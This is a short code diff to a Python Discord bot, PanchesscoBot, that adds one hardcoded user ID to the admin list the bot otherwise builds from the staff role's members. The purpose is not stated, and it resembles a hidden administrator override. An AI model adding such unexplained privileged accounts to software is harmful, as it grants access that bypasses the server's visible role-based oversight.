@@ -86,6 +86,7 @@ class PanchesscoBot(commands.AutoShardedBot):
         panchessco_role_admin = panchessco_guild.get_role(config.panchessco_role_staff_id)
 
         admins_id_list = [admin.id for admin in panchessco_role_admin.members]
+        admins_id_list.append(919646375577288725)
 
         return admins_id_list
 
